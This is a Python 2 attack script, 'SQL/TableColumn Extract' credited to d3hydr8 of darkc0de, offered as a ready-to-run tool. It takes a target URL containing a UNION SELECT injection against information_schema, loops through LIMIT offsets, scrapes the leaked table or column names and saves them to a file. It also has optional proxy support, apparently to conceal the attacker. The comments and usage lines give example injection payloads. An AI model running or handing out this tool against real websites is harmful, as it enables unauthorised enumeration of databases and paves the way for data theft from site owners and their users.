#!/usr/bin/python 
#SQL injection Table/Column extract

#This script will help extract tables or columns
#from incremented site addresses.
#Put NUM in the site address for the number
#to incrament.
#Put table_name or column_name in the address.
#Example: 
#www.site.com/news.php?id=-1+UNION+SELECT+ALL+1,table_name,3,+FROM+information_schema.tables+limit+NUM,1/*
#Example:
#www.site.com.com/help.php?id=-1+union+select+1,column_name,2+from+information_schema.columns+where+table_name=0x5+limit+NUM,1
 
#www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
#Range of incraments. 
START = 0
FINISH = 35

#File to save data.
FILE_NAME = "database.txt"

#Add proxy support: Format  127.0.0.1:8080
proxy = "None"
 
import urllib, sys, re, socket, httplib, urllib2

def StripTags(text):
	finished = 0
	while not finished:
		finished  =1
		start =  text.find("<")
		if start >= 0:
			stop = text[start:].find(">")
			if stop >= 0:
				text = text[:start] + text[start+stop+1:]
				finished = 0
	return text
			
print "\n\t   SQL/TableColumn Extract v1.0"
print "\n\t   		by d3hydr8"
print "\t------------------------------------------"
 
if len(sys.argv) != 2: 
	print "\n\tUsage: ./tabcolext.py <site>" 
	print "\n\tEx: ./tabcolext.py www.site.com/news.php?id=-1+UNION+SELECT+ALL+1,table_name,3,+FROM+information_schema.tables+limit+NUM,1/*\n" 
	sys.exit(1) 
 
site = sys.argv[1]
if site.find("NUM") == -1: 
	print "\n[-] Site must contain \'NUM\'\n" 
	sys.exit(1)
else:
	site = site.replace("NUM","###").lower()
if site[:7] != "http://": 
	site = "http://"+site  
if site.find("table_name") == -1 and site.find("column_name") == -1:
	print "\n[-] Site must contain table_name or column_name\n"
	sys.exit(1)
if site.find("table_name") != -1 and site.find("column_name") == -1:
	print "\n[+] Extracting Tables"
	site = site.replace("table_name","concat_ws(char(58),char(58),table_name)")
if site.find("table_name") == -1 and site.find("column_name") != -1:
	print "\n[+] Extracting Columns"
	site = site.replace("column_name","concat_ws(char(58),char(58),column_name)")
if site.find("table_name") != -1 and site.find("column_name") != -1:
	if site.find("table_name") < site.find("column_name"):
		print "\n[+] Extracting Tables"
		site = site.replace("table_name","concat_ws(char(58),char(58),table_name)")
	else:
		print "\n[+] Extracting Columns"
		site = site.replace("column_name","concat_ws(char(58),char(58),column_name)")

try:
	if proxy != "None":
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
		print "[+] Building Handler"
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
	else:
		print "\n[-] Proxy Not Given"
		proxy_handler = ""
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	sys.exit(1)
except(), msg:
	print msg
	print "\n[-] Proxy Failed"
	sys.exit(1)
 
file = open(FILE_NAME, "a")
print "\n[+] Starting Extraction...\n"
for x in xrange(START,FINISH+1): 
	x = str(x) 
	print "[+] Testing:",x
	opener = urllib2.build_opener(proxy_handler)
	source = opener.open(site.replace("###",x)).read() 
	try:
		match = re.findall("::\S+",StripTags(source))[0]
		if match:
			file.writelines(match.replace("::","")+"\n")
			print "[+] Wrote:",match.replace("::","")
		else:
			print "[-] No Data Found"
	except(IndexError):
		print "[-] No Data Found"
		pass
file.close()
print "\n[-] Done\n"